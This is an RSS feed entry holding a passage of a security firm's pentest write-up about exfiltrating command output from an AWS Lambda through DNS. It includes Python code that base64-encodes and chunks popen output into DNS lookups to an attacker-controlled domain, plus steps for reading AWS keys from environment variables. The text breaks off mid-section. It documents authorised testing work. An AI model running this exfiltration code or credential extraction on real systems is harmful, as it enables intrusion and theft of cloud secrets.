<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>JUMPSEC – Exploitation</title>
    <link>//localhost:1313/categories/exploitation/</link>
    <description>Recent content in Exploitation on JUMPSEC</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-GB</language>
    <lastBuildDate>Thu, 13 Jun 2024 00:00:00 +0000</lastBuildDate>
    
	  <atom:link href="//localhost:1313/categories/exploitation/index.xml" rel="self" type="application/rss+xml" />
    
    
      
        
      
    
    
    <item>
      <title>What’s in a Name? Writing custom DNS tunnelling protocol, exploiting unexpected AWS Lambda misconfiguration – in a web app Pen test (Part 2)</title>
      <link>//localhost:1313/articles/2024/06/2024-06-13-whats-in-a-name-writing-custom-dns-tunnelling-protocol-exploiting-unexpected-aws-lambda-misconfiguration-in-a-web-app-pen-test-part-2/</link>
      <pubDate>Thu, 13 Jun 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/06/2024-06-13-whats-in-a-name-writing-custom-dns-tunnelling-protocol-exploiting-unexpected-aws-lambda-misconfiguration-in-a-web-app-pen-test-part-2/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/unnamed.gif&#34; title=&#34;unnamed&#34; alt=&#34;unnamed&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;unnamed&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In &lt;a href=&#34;https://labs.jumpsec.com/whats-in-a-name-writing-custom-dns-tunnelling-protocol-on-the-fly-exploiting-unexpected-aws-lambda-misconfiguration-all-in-a-web-app-pen-test-part-1/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Part 1&lt;/a&gt; of the series we looked at how an AWS Lambda-powered feature was exploited in a web app penetration test initially leading to RCE and further on with out-of-band data exfiltration via DNS. Though the exact mechanism of achieving remote-code execution with Python was not discussed, we went in depth in how to return data as a result of the code being executed. Initially, with ascii-to-integer encoding I was able to find the username of the runtime user - sbx_userNNN.&lt;/p&gt;
&lt;p&gt;In the first blog post, I spoke of the feature being powered by Lambda rather matter-of-factly, however during the penetration test, the &amp;ldquo;sbx_u&amp;rdquo; string was the first clue that the function I popped was powered by a Lambda.&lt;/p&gt;
&lt;p&gt;Screenshot showing decoding results of whoami:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic1.png&#34; title=&#34;pic1 1&#34; alt=&#34;pic1 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic1 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic2.png&#34; title=&#34;pic2 1&#34; alt=&#34;pic2 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic2 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;After proving that RCE worked stably with limited data output in the application UI, I further discovered that although the app did not talk back via HTTP or HTTPS, it was making DNS requests to arbitrary domains. While BurpSuite&amp;rsquo;s Collaborator functionality was working fine for demonstrating proof-of-concept interactions, it presented a couple of problems as I went further:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic8.png&#34; title=&#34;pic8&#34; alt=&#34;pic8&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic8&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Scalability &amp;amp; UX - I didn&amp;rsquo;t know at the time, but had vaguely remembered, that the exact data length limit of the DNS protocol was around 255 bytes total - need to RTFM (more detail on this later). But even at this point I knew I could not chuck thousands of bytes into a domain name and ask the poor Lambda to query for us. That meant we needed to split command outputs into multiple chunks at some point. Burp is written in Java and the UI (as seen above) would require manually clicking through hundreds of queries to copy and paste the data for further decoding. I needed a tool that either wrote each query to terminal or append to a file, that I could further decode and process.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Privacy &amp;amp; Cost - Honestly, avoiding manually clicking through hundreds of queries was a good enough reason to not proceed further in Burp. However, at that juncture my concerns also included privacy. If I proceeded further on this attack path, I would potentially be exfiltrating intellectual property of the client via the oastify.com domain, which was shared by all users of Burp Collaborator, including other pentesting providers and potentially cybercriminals. Not that I don&amp;rsquo;t trust PortSwigger as a company, but I don&amp;rsquo;t want to mess up some of the queries on my end and potentially send the encoded data to unknown entities.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A final reason, which may not apply to us, but for those reading this article who are just starting out in Cyber - BurpSuite Collaborator is a paywalled feature and the annual enterprise licensing cost may be prohibitive for many hobbyists or learners.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Moving the antenna to our own infrastructure&lt;span class=&#34;absolute -mt-20&#34; id=&#34;moving-the-antenna-to-our-own-infrastructure&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#moving-the-antenna-to-our-own-infrastructure&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;So, is there a private, low-cost / free DNS interaction tool which outputs the log to either the terminal or a file, and works with a domain owned by us? Initially I had fleeting thoughts of spinning up a Bind9 DNS server on a VPS and use a couple of hacked-together shell scripts to do it, but then I thought, man, there are plenty of smart folks in my team who know either this tool or that tool off like the back of their hand, which would serve my specific purpose.&lt;/p&gt;
&lt;p&gt;I asked our techies for help. Initially our developer volunteered to adapt his custom DNS server written in Go for this purpose, but before we could see this big-brain moment through, he had other more pressing matters than pursuing this side quest (a failed motherboard I heard). Then another consultant introduced me to &lt;a href=&#34;https://github.com/projectdiscovery/interactsh&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Interactsh&lt;/a&gt;, an open source tool maintained by ProjectDiscovery, designed to detect out-of-band (OOB) interactions. By default the oast.pro domain (I imagine owned by ProjectDiscovery) is used to catch queries, but one could buy a domain for a couple of bucks and tell the tool to point to it instead.&lt;/p&gt;
&lt;p&gt;Again DNS can be quite complicated if you&amp;rsquo;re not that familiar with the protocol - so I&amp;rsquo;ll briefly explain how the tool works here:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;[vuln app] ---makes DNS query A----&amp;gt; [server]
# then
[client] --ask for records of OOB-----&amp;gt; [server]
[client] &amp;lt;--sends DNS query A details-- [server]&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;In part 1 of this series I explained how DNS exfiltration works, so go to the relevant sections if you want a refresher on that. In the case of Interactsh, the &amp;ldquo;central server&amp;rdquo; maintained by ProjectDiscovery would resolve queries pointing towards subdomains of oast.pro. As a bug bounty hunter, you use the interactsh client to connect to the central interactsh server and be given a unique id. Any OOB interaction caught by the server, which matches your unique ID would be sent to your client and be displayed on your terminal. Screenshot below is from the README of the project, showing how the ID matching works.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic9.png&#34; title=&#34;pic9&#34; alt=&#34;pic9&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic9&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In comparison, shown below is how I set Interactsh up for the engagement. As described in part 1, I needed a domain where we can edit NS and A records. Let&amp;rsquo;s say we own &amp;ldquo;awesome-blogpost.com&amp;rdquo; and I decided to use subdomains of &amp;ldquo;subdomain.awesome-blogpost.com&amp;rdquo; as the query catcher. I spun up a public facing VPS with a static IP address a.b.c.d, pointed the the NS record for the subdomain to it, much like the below (read part 1 if this doesn&amp;rsquo;t make much sense):&lt;/p&gt;
&lt;p&gt;Set an NS record for &lt;code&gt;ns1.awesome-blogpost.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic10.png&#34; title=&#34;pic10&#34; alt=&#34;pic10&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic10&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;So we first start our server on the publicly-facing VPS with domain specified and the server CLI would provide you have a client token, which is like a unique password for the client to connect to (says text in the screenshot because &amp;ldquo;text&amp;rdquo; was the actual subdomain I used in the engagement).&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic11.png&#34; title=&#34;pic11&#34; alt=&#34;pic11&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic11&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic12.png&#34; title=&#34;pic12&#34; alt=&#34;pic12&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic12&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Then on my local machine, I connect to my server with with the client token and the &lt;code&gt;-dns-only&lt;/code&gt; flag, and you can see a unique URL being provided as a OOB payload. If anything makes a DNS query to &amp;ldquo;cnson… .text.awesome-blogpost.com&amp;rdquo;, my server would catch it and show it to the client.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic13.png&#34; title=&#34;pic13&#34; alt=&#34;pic13&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic13&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;Encoding adventures - weird Python error &amp;amp; RTFM&lt;span class=&#34;absolute -mt-20&#34; id=&#34;encoding-adventures---weird-python-error--rtfm&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#encoding-adventures---weird-python-error--rtfm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Before heading off to data encoding and the matter of writing a bootleg encoding protocol, let&amp;rsquo;s first address one thing - DNS is not meant for transmitting arbitrary length messages. I found out the hard way when trying to pipe &lt;code&gt;/etc/passwd&lt;/code&gt; (pentester&amp;rsquo;s favorite!) through the wire - that Python complained of this (on my local testing script):&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Traceback (most recent call last):
  File &amp;#34;/usr/lib/python3.10/encodings/idna.py&amp;#34;, line 163, in encode
    raise UnicodeError(&amp;#34;label empty or too long&amp;#34;)
UnicodeError: label empty or too long&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;To replicate this at home, you can try to run this:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;python3 -c &amp;#39;import socket; longname = &amp;#34;A&amp;#34; * 1000; req = socket.gethostbyname(f&amp;#34;{longname}.example.com&amp;#34;)&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;What happened in that one command was Python being asked to do a DNS request for &amp;ldquo;AAAAA…(1000 of A&amp;rsquo;s)…AAA.example.com&amp;rdquo;. Searching for that error on Google landed me on a &lt;a href=&#34;https://stackoverflow.com/questions/51901399/python-requests-encoding-with-idna-codec-failed-unicodeerror-label-empty-o&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;StackOverflow question&lt;/a&gt; where a dev encountered the same error. A knowledgeable user answered the question explaining that it was actually not a &amp;ldquo;Unicode error&amp;rdquo; but rather a DNS protocol error, implicating the cause being the subdomain within a DNS query being way too long, quote:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It seems this is an issue from the &lt;code&gt;socket&lt;/code&gt; module. It fails when the URL&amp;rsquo;s hostname exceeds 64 characters.&lt;/p&gt;
&lt;p&gt;This is still an open issue &lt;a href=&#34;https://bugs.python.org/issue32958&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://bugs.python.org/issue32958&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Digging deeper into the bug report linked, another user wrote, quote:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The error can be consistently reproduced when the first substring of the url hostname is greater than 64 characters long, as in &amp;ldquo;0123…..90123.example.com&amp;rdquo;. This wouldn&amp;rsquo;t be a problem, … so the entire &amp;ldquo;[user]:[secret]@XXX&amp;rdquo; section must be less than 65 characters long.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;During the pentest I took the explaination as is because 64-byte limit sounded right, though I actually limited my encoding to 60-byte in total for some imagined &amp;ldquo;leeway&amp;rdquo;. When writing this blog post, I read the &lt;a href=&#34;https://www.rfc-editor.org/rfc/rfc1035&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;RFC1035 for DNS&lt;/a&gt; to confirm this (and say I have RTFM&amp;rsquo;d) and discovered, on page 7, that:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The labels … must start with a letter, end with a letter or digit, and have as interior characters only letters, digits, and hyphen … Labels must be 63 characters or less.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Turns out that those users were slightly wrong in that the maximum subdomain / hostname / label defined by the RFC was actually 63-bytes, not 64. You can verify this with tweaking the &lt;code&gt;longname&lt;/code&gt; variable to 64 and 63 in the Python oneliner above. Knowing that the final messages will be maximally 63-byte chunks definitely helps.&lt;/p&gt;
&lt;p&gt;Next we need to think about other limitations of the DNS protocol. In the RFC we just referenced, it is also stated that a label must consist only of (case-insensitive) letters, digits and hyphen. With the input space (command output i.e. STDOUT) consisting of all printable Ascii, including symbols like &lt;code&gt;%^@*#|/&lt;/code&gt;, &lt;code&gt;space&lt;/code&gt; and &lt;code&gt;newline&lt;/code&gt;, and the output space only consisting of letters, numbers and the unassuming hyphen &lt;code&gt;-&lt;/code&gt;, it is clear that some sort of encoding scheme is needed.&lt;/p&gt;
&lt;p&gt;The solution I came up with was the unassuming Base64 encode. Ideally you would want to encrypt the data with something like AES256 CBC as is the case for &amp;ldquo;production&amp;rdquo; C2 frameworks like Cobalt Strike, but we are dealing with a UAT build so let&amp;rsquo;s just roll with what we have.&lt;/p&gt;
&lt;p&gt;Before dealing with the message length, lets see how I implemented the encoding with the code snippet below - first we read the command output for popen() and encode into UTF-8 (because b64encode takes a byte sequence), then the payload was Base64 encoded, gets back a string with decode(&amp;lsquo;UTF-8&amp;rsquo;), and remove all the trailing &lt;code&gt;=&lt;/code&gt; which might appear in b64 encoding.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;data = popen(&amp;#39;uname -r&amp;#39;).read().encode(&amp;#39;UTF-8&amp;#39;) 
payload = b64encode(data).decode(&amp;#39;utf-8&amp;#39;).replace(&amp;#39;=&amp;#39;,&amp;#39;&amp;#39;)
url = f&amp;#39;http://{payload}..subdomain.awesome-blogpost.com&amp;#39;
lookup = gethostbyname(url)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;On Interactsh, we should get back the encoded output:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;[NS4xMC4yMTYtMjI1Ljg1NS5hbXpuMi54ODZfNjQK.&amp;lt;uuid&amp;gt;.subdomain.awesome-blogpost.com.] received DNS interaction from 35....&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Using the &lt;code&gt;base64&lt;/code&gt; cli utility, we would then get back the command output for &lt;code&gt;uname -r&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ echo -n &amp;#39;NS4xMC4yMTYtMjI1Ljg1NS5hbXpuMi54ODZfNjQK&amp;#39; | base64 -d
5.10.216-225.855.amzn2.x86_64&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic7.png&#34; title=&#34;pic7&#34; alt=&#34;pic7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h4&gt;Chunks &amp;amp; Ordering&lt;span class=&#34;absolute -mt-20&#34; id=&#34;chunks--ordering&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#chunks--ordering&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;When I first learnt about how TCP worked, it fascinated me with the inner mechanisms of stateful sessions, message ordering, length and integrity checks, and so on. Basically the protocol involves chopping the sender&amp;rsquo;s message into little chunks, and the receiver can receive them in any order, recombine the chunks, and get back the original message, with a check that a) the message is intact and, b) the message has ended. How brilliant!&lt;/p&gt;
&lt;p&gt;Now that I am about to chop my bootleg DNS messages into 60-odd byte chunks, the minimum that I need to implement is a system which gives a little index tag to the message, and when I get back the messages in any order, my decoder will be able to rearrange them, combine back the original message, and decode them as one.&lt;/p&gt;
&lt;p&gt;Below is how I implemented it (with a little bit of help from our friend ChatGPT…) - if the payload is less than 60 bytes long, we define that the number of segments is 0. Otherwise, it will just be the result of the length of the payload divided by 60 (e.g. for 80 byte payload, the number of segments is 2). We loop through the segments, cutting out &lt;code&gt;60*(n) to 60*(n+1) th&lt;/code&gt; bytes, and finally add the index label before the payload in the final DNS query:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;    data = popen(&amp;#39;ls /usr/bin&amp;#39;).read().encode(&amp;#39;UTF-8&amp;#39;) 
    payload = b64encode(data).decode(&amp;#39;utf-8&amp;#39;).replace(&amp;#39;=&amp;#39;,&amp;#39;&amp;#39;)

    if len(payload) % 60 == 0:
        num_segments = 0
    else:
        num_segments = (len(payload) // 60) &amp;#43; 1 

    for i in range(num_segments):
        start_index = i * 60
        end_index = start_index &amp;#43; 60
        segment = payload[start_index:end_index]
        url = f&amp;#39;{i}.{segment}..subdomain.awesome-blogpost.com&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And the glorious moment of seeing the results back:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;    _       __                       __       __  
   (_)___  / /____  _________ ______/ /______/ /_ 
  / / __ \/ __/ _ \/ ___/ __ &amp;#39;/ ___/ __/ ___/ __ \
 / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /
/_/_/ /_/\__/\___/_/   \__,_/\___/\__/____/_/ /_/

        projectdiscovery.io
[INF] Listing 1 payload for OOB Testing
[INF] .subdomain.awesome-blogpost.com

[0.WwphbGlhcwphcmNoCmF3awpiMnN1bQpiYXNlMzIKYmFzZTY0CmJhc2VuYW1l.] Received DNS interaction (A) from 3.9.x.x at ...
[1.CmJhc2VuYwpiYXNoCmJhc2hidWcKYmFzaGJ1Zy02NApiZwpjYS1sZWdhY3kK.] Received DNS interaction (A) from 3.9.x.x at ...
[2.Y2F0CmNhdGNoc2VndgpjZApjaGNvbgpjaGdycApjaG1vZApjaG93bgpja3N1.] Received DNS interaction (A) from 35.177.x.x at ...
[3.bQpjb21tCmNvbW1hbmQKY29yZXV0aWxzCmNwCmNzcGxpdApjdXJsCmN1dApk.] Received DNS interaction (A) from 18.134.x.x at ...
[4.YXRlCmRkCmRmCmRpcgpkaXJjb2xvcnMKZGlybmFtZQpkbmYKZHUKZWNobwpl.] Received DNS interaction (A) from 35.177.x.x at ...
[5.Z3JlcAplbnYKZXhwYW5kCmV4cHIKZmFjdG9yCmZhbHNlCmZjCmZnCmZncmVw.] Received DNS interaction (A) from 35.177.x.x at ...
...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Mouse over and copy the output, run it through a oneliner to remove the extra stuff, sort it, remove the duplicates, and decode the whole thing:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ xclip -o clip | cut -d &amp;#39; &amp;#39; -f 1 | sed &amp;#39;s/\[//;s/\.\]//&amp;#39; | sort -h | uniq &amp;gt; output26; python3 decode2.py output26
Decoded string: 

alias
arch
awk
...
ls
md5sum
microdnf
mkdir
...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;Look at me, I am the Lambda now&lt;span class=&#34;absolute -mt-20&#34; id=&#34;look-at-me-i-am-the-lambda-now&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#look-at-me-i-am-the-lambda-now&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Now we are cooking! That&amp;rsquo;s basically a semi-interactive shell (with a couple of extra steps). Each command we want to run we put it in the popen(), invoke the app&amp;rsquo;s feature, get back results from Interactsh, and decode in Python. I&amp;rsquo;ll skip the enumeration bit and jump straight to the post-exploitation. Knowing that we are inside of an AWS Lambda, there are quite a few angles to tackle and exploit this. For more information specific to Lambda exploitation, refer to &lt;a href=&#34;https://hackingthe.cloud/aws/post_exploitation/lambda_persistence/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Hacktricks&amp;rsquo; articles on this&lt;/a&gt;. Sadly the pentest timeline was approaching its end and I felt the need to go for the highest impact finding as soon as possible, instead of exploring with a leisurely pace. Having a way to get data out and run commands, we could read environmental variables to extract the AWS secret &amp;amp; access keys of the application. With AWS credentials you can impersonate the application&amp;rsquo;s identity and access (supposedly) whatever the app could access inside of the AWS tenant.&lt;/p&gt;
&lt;p&gt;This was the first method I demonstrated, showing how the &amp;ldquo;AWS_ACCESS_KEY_ID&amp;rdquo; was extracted with os.envrion.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic14.png&#34; title=&#34;pic14&#34; alt=&#34;pic14&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic14&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The second method, reading the environmental vars from &lt;code&gt;/proc/self/environ&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic15.png&#34; title=&#34;pic15&#34; alt=&#34;pic15&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic15&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;To authenticate to AWS with these credentials on the cli, you first put the keys extracted into a profile in your &lt;code&gt;~/.aws/credentials&lt;/code&gt; file like this:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
